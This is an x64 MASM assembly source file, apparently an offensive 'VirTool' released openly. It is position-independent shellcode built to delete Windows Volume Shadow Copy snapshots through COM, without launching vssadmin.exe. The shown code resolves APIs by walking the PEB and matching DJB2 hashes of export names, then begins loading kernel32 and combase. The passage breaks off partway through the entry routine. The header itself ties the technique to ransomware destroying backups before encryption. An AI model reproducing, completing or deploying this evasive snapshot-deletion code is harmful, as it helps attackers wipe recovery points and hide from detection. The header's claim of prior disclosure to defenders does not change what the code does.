;----------------------------------------------------------------------------------------------------------------------
; VirTool: Win64.VirTool.Xaoc
; Author : Paul L. (@am0nsec)
; Version: 1.0
; Link   : https://github.com/am0nsec/vx
;
;
; VirTool features:
;     - Position independent code that can be used as shellcode
;     - Delete VSS snapshots without spawning vssadmin.exe image
;
;
; Please note that the original code (in a more human readable format: i.e., C) for this tool has been sent to various 
; blue-teamer and TI professional prior to its release. This has been decided due to the ongoing ransomware attacks 
; that are deleting VSS snapshot to prevent forensic recovery of encrypted data. 1 month has been provided to identify 
; reliable and scalable detection mechanism.
;
;
; Compilation:
;     - ml64.exe /c /Zi /Fo"XAOS.obj" /W3 /errorReport:prompt XAOS.ASM
;     - link.exe /SUBSYSTEM:CONSOLE /ENTRY:"xaos" /MACHINE:X64 XAOS.obj
;
;
; Thanks to:
;     - @smelly__vx
;     - deadlock
;     - @Coldzer0x0
;     - @0xA9five
;----------------------------------------------------------------------------------------------------------------------

IFNDEF __XAOS_GUARD__
__XAOS_GUARD__ EQU <1>

;----------------------------------------------------------------------------------------------------------------------
; Structures
;----------------------------------------------------------------------------------------------------------------------
GUID STRUCT
    Data1 DWORD ?
    Data2 WORD ?
    Data3 WORD ?
    Data4 BYTE 7 dup(?)
GUID ENDS

_LUID STRUCT
    LowPart  DWORD ?
    HighPart DWORD ? 
_LUID ENDS

_LUID_AND_ATTRIBUTES STRUCT 
    Luid       _LUID <>
    Attributes DWORD ?
_LUID_AND_ATTRIBUTES ENDS

_TOKEN_PRIVILEGES STRUCT
    PrivilegeCount DWORD ?
    Privileges     _LUID_AND_ATTRIBUTES 1 dup(<>)
_TOKEN_PRIVILEGES ENDS

_VSS_SNAPSHOT_PROP STRUCT 
    m_SnapshotId               GUID <>
    m_SnapshotSetId            GUID <>
    m_lSnapshotsCount          QWORD ?
    m_pwszSnapshotDeviceObject QWORD ?
    m_pwszOriginalVolumeName   QWORD ?
    m_pwszOriginatingMachine   QWORD ?
    m_pwszServiceMachine       QWORD ?
    m_pwszExposedName          QWORD ?
    m_pwszExposedPath          QWORD ?
    m_ProviderId               GUID <>
    m_lSnapshotAttributes      QWORD ?
    m_tsCreationTimestamp      QWORD ?
    m_eStatus                  QWORD ?
_VSS_SNAPSHOT_PROP ENDS

_VSS_PROVIDER_PROP STRUCT
    m_ProviderId          GUID <>
    m_pwszProviderName    QWORD ?
    m_eProviderType       DWORD ?
    m_pwszProviderVersion QWORD ?
    m_ProviderVersionId   GUID <>
    m_ClassId             GUID <>
_VSS_PROVIDER_PROP ENDS

_VSS_OBJECT_PROP STRUCT 
    ObjType QWORD ?
    UNION
        Snap _VSS_SNAPSHOT_PROP <>
        Prov _VSS_PROVIDER_PROP <>
    ENDS
_VSS_OBJECT_PROP ENDS

LARGE_INTEGER struct
    LowPart  DWORD ? ; 0x0000
    HighPart DWORD ? ; 0x0004
LARGE_INTEGER ends

ULARGE_INTEGER struct 
    LowPart  DWORD ? ; 0x0000
    HighPart DWORD ? ; 0x0004
ULARGE_INTEGER ends

UNICODE_STRING struct
    _Length       WORD ?        ; 0x0000
    MaximumLength WORD ?        ; 0x0002
                  BYTE 4 dup(?) ; padding
    Buffer        QWORD ?       ; 0x0008
UNICODE_STRING ends

LIST_ENTRY struct
    Flink QWORD ? ; 0x0000
    BLink QWORD ? ; 0x0008
LIST_ENTRY ends

PEB struct
    InheritedAddressSpace                BYTE ?            ; 0x0000
    ReadImageFileExecOptions             BYTE ?            ; 0x0001
    BeingDebugged                        BYTE ?            ; 0x0002
    BitField                             BYTE ?            ; 0x0003
    Padding0                             BYTE 4 dup(?)     ; 0x0004
    Mutant                               QWORD ?           ; 0x0008
    ImageBaseAddress                     QWORD ?           ; 0x0010
    Ldr                                  QWORD ?           ; 0x0018
    ProcessParameters                    QWORD ?           ; 0x0020
    SubSystemData                        QWORD ?           ; 0x0028
    ProcessHeap                          QWORD ?           ; 0x0030
    FastPebLock                          QWORD ?           ; 0x0038
    AtlThunkSListPtr                     QWORD ?           ; 0x0040
    IFEOKey                              QWORD ?           ; 0x0048
    CrossProcessFlags                    DWORD ?           ; 0x0050
    Padding1                             BYTE 4 dup(?)     ; 0x0054
    UserSharedInfoPtr                    QWORD ?           ; 0x0058
    SystemReserved                       DWORD ?           ; 0x0060
    AtlThunkSListPtr32                   DWORD ?           ; 0x0064
    ApiSetMap                            QWORD ?           ; 0x0068
    TlsExpansionCounter                  DWORD ?           ; 0x0070
    Padding2                             BYTE 4 dup(?)     ; 0x0074
    TlsBitmap                            QWORD ?           ; 0x0078
    TlsBitmapBits                        DWORD 2 dup(?)    ; 0x0080
    ReadOnlySharedMemoryBase             QWORD ?           ; 0x0088
    SharedData                           QWORD ?           ; 0x0090
    ReadOnlyStaticServerData             QWORD ?           ; 0x0098
    AnsiCodePageData                     QWORD ?           ; 0x00A0
    OemCodePageData                      QWORD ?           ; 0x00A8
    UnicodeCaseTableData                 QWORD ?           ; 0x00B0
    NumberOfProcessors                   DWORD ?           ; 0x00B9
    NtGlobalFlag                         DWORD ?           ; 0x00BC
    CriticalSectionTimeout               LARGE_INTEGER <>  ; 0x00C0
    HeapSegmentReserve                   QWORD ?           ; 0x00C8
    HeapSegmentCommit                    QWORD ?           ; 0x00D0
    HeapDeCommitTotalFreeThreshold       QWORD ?           ; 0x00D8
    HeapDeCommitFreeBlockThreshold       QWORD ?           ; 0x00E0
    NumberOfHeaps                        DWORD ?           ; 0x00E8
    MaximumNumberOfHeaps                 DWORD ?           ; 0x00EC
    ProcessHeaps                         QWORD ?           ; 0x00F0
    GdiSharedHandleTable                 QWORD ?           ; 0x00F8
    ProcessStarterHelper                 QWORD ?           ; 0x0100
    GdiDCAttributeList                   DWORD ?           ; 0x0108
    Padding3                             BYTE 4 dup(?)     ; 0x010C
    LoaderLock                           QWORD ?           ; 0x0110
    OSMajorVersion                       DWORD ?           ; 0x0118
    OSMinorVersion                       DWORD ?           ; 0x011C
    OSBuildNumber                        WORD ?            ; 0x0120
    OSCSDVersion                         WORD ?            ; 0x0122
    OSPlatformId                         DWORD ?           ; 0x0124
    ImageSubsystem                       DWORD ?           ; 0x0128
    ImageSubsystemMajorVersion           DWORD ?           ; 0x012C
    ImageSubsystemMinorVersion           DWORD ?           ; 0x0130
    Padding4                             BYTE 4 dup(?)     ; 0x0134
    ActiveProcessAffinityMask            QWORD ?           ; 0x0138
    GdiHandleBuffer                      DWORD 60 dup(?)   ; 0x0140
    PostProcessInitRoutine               QWORD ?           ; 0x0230
    TlsExpansionBitmap                   QWORD ?           ; 0x0238
    TlsExpansionBitmapBits               DWORD 32 dup(?)   ; 0x0240
    SessionId                            DWORD ?           ; 0x02C0
    Padding5                             BYTE 4 dup(?)     ; 0x02C4
    AppCompatFlags                       ULARGE_INTEGER <> ; 0x02C8
    AppCompatFlagsUser                   ULARGE_INTEGER <> ; 0x02D0
    pShimData                            QWORD ?           ; 0x02D8
    AppCompatInfo                        QWORD ?           ; 0x02E0
    CSDVersion                           UNICODE_STRING <> ; 0x02E8
    ActivationContextData                QWORD ?           ; 0x02F8
    ProcessAssemblyStorageMap            QWORD ?           ; 0x0300
    SystemDefaultActivationContextData   QWORD ?           ; 0x0308
    SystemAssemblyStorageMap             QWORD ?           ; 0x0310
    MinimumStackCommit                   QWORD ?           ; 0x0318
    SparePointers                        QWORD 4 dup(?)    ; 0x0320
    SpareUlongs                          DWORD 5 dup(?)    ; 0x0340
                                         BYTE 4 dup(?)
    WerRegistrationData                  QWORD ?           ; 0x0358
    WerShipAssertPtr                     QWORD ?           ; 0x0360
    pUnused                              QWORD ?           ; 0x0368
    pImageHeaderHash                     QWORD ?           ; 0x0370
    TracingFlags                         DWORD ?           ; 0x0378
    Padding6                             BYTE 4 dup(?)     ; 0x037c
    CsrServerReadOnlySharedMemoryBase    QWORD ?           ; 0x0380
    TppWorkerpListLock                   QWORD ?           ; 0x0388
    TppWorkerpList                       LIST_ENTRY <>     ; 0x0390
    WaitOnAddressHashTable               QWORD 128 dup(?)  ; 0x03A0
    TelemetryCoverageHeader              QWORD ?           ; 0x07A0
    CloudFileFlags                       DWORD ?           ; 0x07A8
    CloudFileDiagFlags                   DWORD ?           ; 0x07AC
    PlaceholderCompatibilityMode         BYTE ?            ; 0x07B0
    PlaceholderCompatibilityModeReserved BYTE 7 dup(?)     ; 0x07B1
    LeapSecondData                       QWORD ?           ; 0x07B8
    LeapSecondFlags                      DWORD ?           ; 0x07c0
    NtGlobalFlag2                        DWORD ?           ; 0x07c4
PEB ends

PEB_LDR_DATA struct 
    _Length                         DWORD ?       ; 0x0000
    Initialized                     BYTE ?        ; 0x0004
                                    BYTE 3 dup(?) ; padding
    SsHandle                        QWORD ?       ; 0x0008
    InLoadOrderModuleList           LIST_ENTRY <> ; 0x0010
    InMemoryOrderModuleList         LIST_ENTRY <> ; 0x0020
    InInitializationOrderModuleList LIST_ENTRY <> ; 0x0030
    EntryInProgress                 QWORD ?       ; 0x0040
    ShutdownInProgress              BYTE ?        ; 0x0048
                                    BYTE 7 dup(?) ; padding
    ShutdownThreadId                QWORD ?       ; 0x0050
PEB_LDR_DATA ends

RTL_BALANCED_NODE struct 
    _Dummy BYTE 24 dup(?)
RTL_BALANCED_NODE ends

LDR_DATA_TABLE_ENTRY struct 
    InLoadOrderLinks            LIST_ENTRY <>        ; 0x0000
    InMemoryOrderLinks          LIST_ENTRY <>        ; 0x0010
    InInitializationOrderLinks  LIST_ENTRY <>        ; 0x0020
    DllBase                     QWORD ?              ; 0x0030
    EntryPoint                  QWORD ?              ; 0x0038
    SizeOfImage                 DWORD ?              ; 0x0040
                                BYTE 4 dup(?)        ; padding
    FullDllName                 UNICODE_STRING <>    ; 0x0048
    BaseDllName                 UNICODE_STRING <>    ; 0x0058
    FlagGroup                   BYTE 4 dup(?)        ; 0x0068
    ObsoleteLoadCount           WORD ?               ; 0x006C
    TlsIndex                    WORD ?               ; 0x006E
    HashLinks                   LIST_ENTRY <>        ; 0x0070
    TimeDateStamp               DWORD ?              ; 0x0080
                                BYTE 4 dup(?)        ; padding 
    EntryPointActivationContext QWORD ?              ; 0x0088
    _Lock                       QWORD ?              ; 0x0090
    DdagNode                    QWORD ?              ; 0x0098
    NodeModuleLink              LIST_ENTRY <>        ; 0x00A0
    LoadContext                 QWORD ?              ; 0x00B0
    ParentDllBase               QWORD ?              ; 0x00B8
    SwitchBackContext           QWORD ?              ; 0x00C0
    BaseAddressIndexNode        RTL_BALANCED_NODE <> ; 0x00C8
    MappingInfoIndexNode        RTL_BALANCED_NODE <> ; 0x00E0
    OriginalBase                QWORD ?              ; 0x00F8
    LoadTime                    LARGE_INTEGER <>     ; 0x0100
    BaseNameHashValue           DWORD ?              ; 0x0108
    LoadReason                  DWORD ?              ; 0x010C
    ImplicitPathOptions         DWORD ?              ; 0x0110
    ReferenceCount              DWORD ?              ; 0x0114
    DependentLoadFlags          DWORD ?              ; 0x0118      
    SigningLevel                BYTE ?               ; 0x011C
LDR_DATA_TABLE_ENTRY ends

IMAGE_DOS_HEADER struct
    e_magic    WORD ?         ; 0x0000 
    e_cblp     WORD ?         ; 0x0002
    e_cp       WORD ?         ; 0x0004
    e_crlc     WORD ?         ; 0x0006
    e_cparhdr  WORD ?         ; 0x0008
    e_minalloc WORD ?         ; 0x000A
    e_maxalloc WORD ?         ; 0x000C
    e_ss       WORD ?         ; 0x000E
    e_sp       WORD ?         ; 0x0010
    e_csum     WORD ?         ; 0x0012
    e_ip       WORD ?         ; 0x0014
    e_cs       WORD ?         ; 0x0016
    e_lfarlc   WORD ?         ; 0x0018
    e_ovno     WORD ?         ; 0x001A
    e_res      WORD 4 dup(?)  ; 0x001C
    e_oemid    WORD ?         ; 0x0024
    e_oeminfo  WORD ?         ; 0x0026
    e_res2     WORD 10 dup(?) ; 0x0028
    e_lfanew   DWORD ?        ; 0x003C
IMAGE_DOS_HEADER ends

IMAGE_FILE_HEADER struct
    Machine              WORD ?  ; 0x0000
    NumberOfSections     WORD ?  ; 0x0002
    TimeDateStamp        DWORD ? ; 0x0004
    PointerToSymbolTable DWORD ? ; 0x0008
    NumberOfSymbols      DWORD ? ; 0x000c
    SizeOfOptionalHeader WORD ?  ; 0x0010
    Characteristics      WORD ?  ; 0x0012
IMAGE_FILE_HEADER ends

IMAGE_DATA_DIRECTORY struct
    VirtualAddress DWORD ? ; 0x0000
    _Size          DWORD ? ; 0x0004
IMAGE_DATA_DIRECTORY ends

IMAGE_OPTIONAL_HEADER64 struct
    Magic                       WORD ?                          ; 0x0000
    MajorLinkerVersion          BYTE ?                          ; 0x0002
    MinorLinkerVersion          BYTE ?                          ; 0x0003
    SizeOfCode                  DWORD ?                         ; 0x0004
    SizeOfInitializedData       DWORD ?                         ; 0x0008
    SizeOfUninitializedData     DWORD ?                         ; 0x000C
    AddressOfEntryPoint         DWORD ?                         ; 0x0010
    BaseOfCode                  DWORD ?                         ; 0x0014
    ImageBase                   QWORD ?                         ; 0x0018
    SectionAlignment            DWORD ?                         ; 0x0020
    FileAlignment               DWORD ?                         ; 0x0024
    MajorOperatingSystemVersion WORD ?                          ; 0x0028
    MinorOperatingSystemVersion WORD ?                          ; 0x002a
    MajorImageVersion           WORD ?                          ; 0x002C
    MinorImageVersion           WORD ?                          ; 0x002E
    MajorSubsystemVersion       WORD ?                          ; 0x0030
    MinorSubsystemVersion       WORD ?                          ; 0x0032
    Win32VersionValue           DWORD ?                         ; 0x0034
    SizeOfImage                 DWORD ?                         ; 0x0038
    SizeOfHeaders               DWORD ?                         ; 0x003c
    CheckSum                    DWORD ?                         ; 0x0040
    Subsystem                   WORD ?                          ; 0x0044
    DllCharacteristics          WORD ?                          ; 0x0046
    SizeOfStackReserve          QWORD ?                         ; 0x0048
    SizeOfStackCommit           QWORD ?                         ; 0x0050
    SizeOfHeapReserve           QWORD ?                         ; 0x0058
    SizeOfHeapCommit            QWORD ?                         ; 0x0060
    LoaderFlags                 DWORD ?                         ; 0x0068
    NumberOfRvaAndSizes         DWORD ?                         ; 0x006C
    DataDirectory               IMAGE_DATA_DIRECTORY 16 dup(<>) ; 0x0070
IMAGE_OPTIONAL_HEADER64 ends

IMAGE_NT_HEADERS64 struct
    Signature      DWORD ?                    ; 0x0000
    FileHeader     IMAGE_FILE_HEADER <>       ; 0x0004
    OptionalHeader IMAGE_OPTIONAL_HEADER64 <> ; 0x0018
IMAGE_NT_HEADERS64 ends

IMAGE_EXPORT_DIRECTORY struct
    Characteristics       DWORD ? ; 0x0000
    TimeDateStamp         DWORD ? ; 0x0004
    MajorVersion          WORD  ? ; 0x0008
    MinorVersion          WORD  ? ; 0x000A
    _Name                 DWORD ? ; 0x000C
    Base                  DWORD ? ; 0x0010
    NumberOfFunctions     DWORD ? ; 0x0014
    NumberOfNames         DWORD ? ; 0x0018
    AddressOfFunctions    DWORD ? ; 0x001C
    AddressOfNames        DWORD ? ; 0x0020
    AddressOfNameOrdinals DWORD ? ; 0x0024
IMAGE_EXPORT_DIRECTORY ends

;----------------------------------------------------------------------------------------------------------------------
; GlobalOptions COM server
;----------------------------------------------------------------------------------------------------------------------
GlobalOptionsVtbl STRUCT
    QueryInterface QWORD ? 
    AddRef         QWORD ?
    Release        QWORD ?
    Set            QWORD ?
    Query          QWORD ?
GlobalOptionsVtbl ENDS

PGlobalOptionsVtbl TYPEDEF PTR GlobalOptionsVtbl

IGlobalOptions STRUCT
    lpVtbl PGlobalOptionsVtbl ?
IGlobalOptions ENDS

;----------------------------------------------------------------------------------------------------------------------
; VssCoordinator COM server
;----------------------------------------------------------------------------------------------------------------------
VssCoordinatorVtbl STRUCT
    QueryInterface        QWORD ? 
    AddRef                QWORD ?
    Release               QWORD ?
    SetContext            QWORD ?
    StartSnapshotSet      QWORD ?
    AddToSnapshotSet      QWORD ?
    DoSnapshotSet         QWORD ?
    GetSnapshotProperties QWORD ?
    ExposeSnapshot        QWORD ?
    ImportSnapshots       QWORD ?
    Query                 QWORD ?
    DeleteSnapshots       QWORD ?
    BreakSnapshotSet      QWORD ?
    RevertToSnapshot      QWORD ?
    QueryRevertStatus     QWORD ?
    IsVolumeSupported     QWORD ?
    IsVolumeSnapshotted   QWORD ?
    SetWriterInstance     QWORD ?
VssCoordinatorVtbl ENDS

PVssCoordinatorVtbl TYPEDEF PTR VssCoordinatorVtbl

IVssCoordinator STRUCT 
    lpVtbl PVssCoordinatorVtbl ?
IVssCoordinator ENDS

;----------------------------------------------------------------------------------------------------------------------
; VssEnumObject COM server
;----------------------------------------------------------------------------------------------------------------------
VssEnumObjectVtbl STRUCT 
    QueryInterface QWORD ? 
    AddRef         QWORD ?
    Release        QWORD ?
    Next           QWORD ?
    Skip           QWORD ?
    Reset          QWORD ?
    Clone          QWORD ?
VssEnumObjectVtbl ENDS

PVssEnumObjectVtbl TYPEDEF PTR VssEnumObjectVtbl

IVssEnumObject STRUCT
    lpVtbl PVssEnumObjectVtbl ?
IVssEnumObject ENDS

ENDIF ; !__XAOS_GUARD__

;----------------------------------------------------------------------------------------------------------------------
; Code segment
;----------------------------------------------------------------------------------------------------------------------
_TEXT$00 SEGMENT ALIGN(10h) 'CODE'
	
	; @brief Collection of GUID for diffrent COM classes.
	Classes PROC
	; @brief GUID of the GlobalOptions COM class: 0000034B-0000-0000-C000-000000000046
	CLSID_GlobalOptions LABEL PTR
		dword 0000034Bh
		word  0000h
		word  0000h
		byte  0c0h
		byte  00h
		byte  00h
		byte  00h
		byte  00h
		byte  00h
		byte  00h
		byte  46h
	; @brief GUID of the VssCoordinator COM class: e579ab5f-1cc4-44b4-bed9-de0991ff0623
	CLSID_VssCoordinator LABEL PTR
		dword 0e579ab5fh
		word  1cc4h
		word  44b4h
		byte  0beh
		byte  0d9h
		byte  0deh
		byte  09h
		byte  91h
		byte  0ffh
		byte  06h
		byte  23h
	; @brief NULL GUID
	CLSID_NULL LABEL PTR
		dword 00000000h
		word  0000h
		word  0000h
		byte  00h
		byte  00h
		byte  00h
		byte  00h
		byte  00h
		byte  00h
		byte  00h
		byte  00h
	Classes ENDP


	; @brief Collection of GUID for diffrent COM interfaces.
	Interfaces PROC
	; @brief GUID of the GlobalOptions COM interface: 0000015B-0000-0000-C000-000000000046
	IID_GlobalOptions LABEL PTR
		dword 0000015Bh
		word  0000h
		word  0000h
		byte  0c0h
		byte  00h
		byte  00h
		byte  00h
		byte  00h
		byte  00h
		byte  00h
		byte  46h
	; @brief GUID of the VssCoordinator COM interface: da9f41d4-1a5d-41d0-a614-6dfd78df5d05
	IID_VssCoordinator LABEL PTR
		dword 0da9f41d4h
		word  1a5dh
		word  41d0h
		byte  0a6h
		byte  014h
		byte  6dh
		byte  0fdh
		byte  78h
		byte  0dfh
		byte  5dh
		byte  05h
	Interfaces ENDP


	; @brief Collection of COM objects.
	Objects PROC
		GlobalOptions LABEL PTR
			IGlobalOptions <>
		VssCoordinator LABEL PTR
			IVssCoordinator <>
		VssEnumObject LABEL PTR
			IVssEnumObject <>
	Objects ENDP


	; @brief Collection of function pointers
	Functions PROC
    	; ntdll.dll function
		LdrLoadDll LABEL PTR
			QWORD ?
        RtlAdjustPrivilege LABEL PTR
			QWORD ?
		; kernel32.dll functions
		CloseHandle LABEL PTR
			QWORD ?
		ExitProcess LABEL PTR
			QWORD ?
		VirtualProtect LABEL PTR
			QWORD ?
		; ole32.dll functions
		CoCreateInstance LABEL PTR
			QWORD ?
		CoInitializeEx LABEL PTR
			QWORD ?
		CoInitializeSecurity LABEL PTR
			QWORD ?
		CoUninitialize LABEL PTR
			QWORD ?
	Functions ENDP


	; @brief Initialise the tool by resolving all the required modules and their functions. 
	ResolveFunctionAddresses PROC
;----------------------------------------------------------------------------------------------------------------------
; 1. Find the base of the module if not provided (will only work for ntdll in order to find LdrLoadDll). 
;----------------------------------------------------------------------------------------------------------------------
	_start:
		cmp rdx, 00h                                                                               ;
		jnz _get_export_directrory                                                                 ;

		mov rdx, gs:[60h]                                                                          ; Get process environment block (PEB)
		cmp [rdx].PEB.OSMajorVersion, 0Ah                                                          ; 
		jne _exit                                                                                  ; Jump if not Windows 10

		; Get the base address of ntdll
		mov rdx, [rdx].PEB.Ldr                                                                     ; 
		mov rdx, [rdx].PEB_LDR_DATA.InMemoryOrderModuleList.Flink - 10h                            ; First loaded module: e.g. xaos.exe
		mov rdx, [rdx].LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks.Flink - 10h                         ; Second loaded module: e.g. ntdll.dll
		mov rdx, [rdx].LDR_DATA_TABLE_ENTRY.DllBase                                                ; Image base of the module

;----------------------------------------------------------------------------------------------------------------------
; 2. Get the Export Address Table (EAT) of the module. 
;----------------------------------------------------------------------------------------------------------------------
	_get_export_directrory:
		; Get module export directory
		mov r15, rdx                                                                               ;
		cmp [rdx].IMAGE_DOS_HEADER.e_magic, 5A4Dh                                                  ; DOS Header --> MZ
		jne _exit                                                                                  ; 

		mov ebx, [rdx].IMAGE_DOS_HEADER.e_lfanew                                                   ; RVA of IMAGE_NT_HEADERS64
		add rdx, rbx                                                                               ; 
		cmp [rdx].IMAGE_NT_HEADERS64.Signature, 00004550h                                          ; NT Header --> PE00
		jne _exit                                                                                  ; 

		mov ebx, IMAGE_NT_HEADERS64.OptionalHeader                                                 ; RVA of IMAGE_OPTIONAL_HEADER64
		add rdx, rbx                                                                               ;                                              
		cmp [rdx].IMAGE_OPTIONAL_HEADER64.Magic, 20bh                                              ; Optional header --> 0x20b
		jne _exit                                                                                  ;

		lea rdx, [rdx].IMAGE_OPTIONAL_HEADER64.DataDirectory                                       ; First entry of the DataDirectory array
		mov ebx, [rdx].IMAGE_DATA_DIRECTORY.VirtualAddress                                         ; RVA of IMAGE_EXPORT_DIRECTORY
		mov rdx, r15                                                                               ; ImageBase
		add rdx, rbx                                                                               ; Module + RVA

;----------------------------------------------------------------------------------------------------------------------
; 3. Resolve address of the diffrent tables
;----------------------------------------------------------------------------------------------------------------------
	_get_table_addresses:
		xor r14, r14                                                                               ;
		xor r13, r13                                                                               ;
		xor r12, r12                                                                               ;
		xor r11, r11                                                                               ;

		mov ebx, [rdx].IMAGE_EXPORT_DIRECTORY.AddressOfNames                                       ; Address of the function name
		mov r11, r15                                                                               ; Function name RVA
		add r11, rbx                                                                               ; ImageBase + RVA

		mov ebx, [rdx].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions                                   ; Address of function pointers
		mov r12, r15                                                                               ;
		add r12, rbx                                                                               ;

		mov ebx, [rdx].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals                                ; Address of function ordinals
		mov r13, r15                                                                               ;
		add r13, rbx                                                                               ;

		mov r14d, [rdx].IMAGE_EXPORT_DIRECTORY.NumberOfNames                                       ; Total number of named functions
		dec r14                                                                                    ;

;----------------------------------------------------------------------------------------------------------------------
; 4. Parse the exported functions to find the functiosn required by this tool
;----------------------------------------------------------------------------------------------------------------------
		dec rcx                                                                                    ;
	_parse_functions_name:
		mov rbx, 4h                                                                                ; sizeof(DWORD)
		imul rbx, r14                                                                              ; siezof(DWORD) * RCX
		mov esi, [r11 + rbx]                                                                       ; Function RVA 
		add rsi, r15                                                                               ; Function RVA + ImageBase

		mov ebx, 5381h                                                                             ; hash = 0x5381
	_djb2_hash:
		mov r10d, ebx                                                                              ; Store original hash value for later
		shl ebx, 05h                                                                               ; hash << 5 
		add ebx, r10d                                                                              ; (hash << 5) + hash

		xor r10d, r10d                                                                             ; Clean temporary hash value
		mov r10b, byte ptr [rsi]                                                                   ; Get ASCII char
		add ebx, r10d                                                                              ; ((hash << 5) + hash) + char

		inc rsi                                                                                    ; Next string char
		cmp byte ptr [rsi], 00h                                                                    ; End of string
		jne _djb2_hash                                                                             ;

;----------------------------------------------------------------------------------------------------------------------
; 5. Check hash value 
;----------------------------------------------------------------------------------------------------------------------
		mov r10d, dword ptr [r8 + 4 * rcx]                                                         ;
		cmp r10d, ebx                                                                              ; Check if hashes matches
		je _get_function_address                                                                   ;
		dec r14                                                                                    ; 
		jmp _parse_functions_name                                                                  ;

;----------------------------------------------------------------------------------------------------------------------
; 6. Get the address of the function and modify the jump table
;----------------------------------------------------------------------------------------------------------------------
	_get_function_address:
		mov rax, 2h                                                                                ; sizeof(WORD)
		imul rax, r14                                                                              ; sizeof(WORD) * R14
		mov ax, [r13 + rax]                                                                        ; AX = function ordinal

		imul rax, 4                                                                                ; sizeof(DWORD) * ordinal
		mov eax, [r12 + rax]                                                                       ; RVA of function
		mov rbx, r15                                                                               ; RBX = ImageBase
		add rbx, rax                                                                               ; RBX = address of function
		mov qword ptr [r9 + 8 * rcx], rbx

	_reset_loopp:
		mov r14d, [rdx].IMAGE_EXPORT_DIRECTORY.NumberOfNames                                       ; Reset number of named functions
		dec r14                                                                                    ; 
		dec rcx                                                                                    ; Next function to find
		jns _parse_functions_name                                                                  ;

;----------------------------------------------------------------------------------------------------------------------
; 7. Exit this routine
;----------------------------------------------------------------------------------------------------------------------      
	_exit:
		xor eax, eax
		inc eax
		ret
	ResolveFunctionAddresses ENDP


	; @brief Entry point.
	xaoc PROC
		push rbp                                                                                   ; Frame pointer
		mov rbp, rsp                                                                               ; Stack pointer
		sub rsp, 1F0h                                                                              ; Room for stack
		and rsp, not 8                                                                             ; Shadow stack alignment

	_start:
;----------------------------------------------------------------------------------------------------------------------
; 1. Initialise the tool by resolving all the modules and their functions
;
; rsp + 20h - dwLdrLoadDll           0x0fd5649f
; rsp + 24h - dwRtlAdjustPrivilege   0xbf6edb85 
; rsp + 28h - dwCloseHandle          0xdeef8303	
; rsp + 2Ch - dwExitProces           0x5de7ec9a	
; rsp + 30h - dwVirtualProtect       0xe77dd909
; rsp + 34h - dwCoCreateInstance	 0xa5121f9c
; rsp + 38h - dwCoInitializeEx       0x24fb7662
; rsp + 4Ch - dwCoInitializeSecurity 0xa982945d
; rsp + 40h - dwCoUninitialize       0x6473dfc8
;----------------------------------------------------------------------------------------------------------------------
; rsp + 50h - LdrLoadDll
; rsp + 58h - RtlAdjustPrivilege
; rsp + 60h - CloseHandle
; rsp + 68h - ExitProces
; rsp + 70h - VirtualProtect
; rsp + 78h - CoCreateInstance
; rsp + 80h - CoInitializeEx
; rsp + 88h - CoInitializeSecurity
; rsp + 90h - CoUninitialize
;----------------------------------------------------------------------------------------------------------------------
		mov dword ptr [rsp + 20h], 0fd5649fh                                                       ; LdrLoadDll DJB2 hash
		mov dword ptr [rsp + 24h], 0bf6edb85h                                                      ; RtlAdjustPrivilege DJB2 Hash
		mov dword ptr [rsp + 28h], 0deef8303h                                                      ; CloseHandle DJB2 hash
		mov dword ptr [rsp + 2Ch], 5de7ec9ah                                                       ; ExitProces DJB2 Hash
		mov dword ptr [rsp + 30h], 0e77dd909h                                                      ; VirtualProtect DJB2 hash
		mov dword ptr [rsp + 34h], 0a5121f9ch                                                      ; CoCreateInstance DJB2 Hash
		mov dword ptr [rsp + 38h], 24fb7662h                                                       ; CoInitializeEx DJB2 hash
		mov dword ptr [rsp + 3Ch], 0a982945dh                                                      ; CoInitializeSecurity DJB2 Hash
		mov dword ptr [rsp + 40h], 6473dfc8h                                                       ; CoUninitialize DJB2 Hash

		; Get address of LdrLoadDll and RtlAdjustPrivilege
		xor ecx, ecx                                                                               ; Number of function to resolve
		add ecx, 02h                                                                               ; 
		xor edx, edx                                                                               ; Module Base
		mov r8, rsp                                                                                ; Address of the hashes
		add r8, 20h                                                                                ;
		mov r9, rsp                                                                                ; Address of the function pointers
		add r9, 50h                                                                                ;
		call ResolveFunctionAddresses                                                              ;

		; Get the address of kernel32.dll
		mov dword ptr [rsp + 0B0h], 0065006bh                                                      ; ke
		mov dword ptr [rsp + 0B4h], 006e0072h                                                      ; rn
		mov dword ptr [rsp + 0B8h], 006c0065h                                                      ; el
		mov dword ptr [rsp + 0BCh], 00320033h                                                      ; 32
		mov dword ptr [rsp + 0C0h], 0064002eh                                                      ; .d
		mov dword ptr [rsp + 0C4h], 006c006ch                                                      ; ll
		mov dword ptr [rsp + 0C8h], 00000000h                                                      ; Null terminator

		mov r10, rsp                                                                               ;
		add r10, 0A0h + sizeof UNICODE_STRING                                                      ; Address of the wide string
		mov qword ptr [rsp + 0A0h].UNICODE_STRING.Buffer, r10                                      ;
		mov dword ptr [rsp + 0A0h].UNICODE_STRING._Length, 18h                                     ; strlen(Buffer)
		mov dword ptr [rsp + 0A0h].UNICODE_STRING.MaximumLength, 1Ah                               ; sizeof(Buffer)

		xor rcx, rcx                                                                               ; PathToFile 
		xor rdx, rdx                                                                               ; Flags
		mov r8, rsp                                                                                ; ModuleFileName
		add r8, 0A0h                                                                               ;
		mov r9, rsp                                                                                ; ModuleHandle 
		add r9, 0D0h                                                                               ; 
		mov rax, [rsp + 50h]                                                                       ; Address of LdrLoadDll
		call rax                                                                                   ; Call LdrLoadDll function

		; Get address of CloseHandle, ExitProces, VirtualProtect
		mov rdx, [rsp + 0D0h]                                                                      ; Module base
		mov rcx, 03h                                                                               ; Number of function to resolve
		mov r8, rsp                                                                                ; Address of the hashes
		add r8, 28h                                                                                ;
		mov r9, rsp                                                                                ; Address of the function pointers
		add r9, 60h                                                                                ;
		call ResolveFunctionAddresses                                                              ; 

		; Loading comebase.dll module
		mov dword ptr [rsp + 0B0h], 006f0063h                                                      ; co
		mov dword ptr [rsp + 0B4h], 0062006dh                                                      ; mb
		mov dword ptr [rsp + 0B8h], 00730061h                                                      ; as
		mov dword ptr [rsp + 0BCh], 002e0065h                                                      ; e.
		mov dword ptr [rsp + 0C0h], 006c0064h                                                      ; dl
		mov dword ptr [rsp + 0C4h], 0000006ch                                                      ; l + Null terminator
		mov dword ptr [rsp + 0C8h], 00000000h                                                      ; 00000000h

		mov r10, rsp                                                                               ;
		add r10, 0A0h + sizeof UNICODE_STRING                                                      ; Address of the wide string
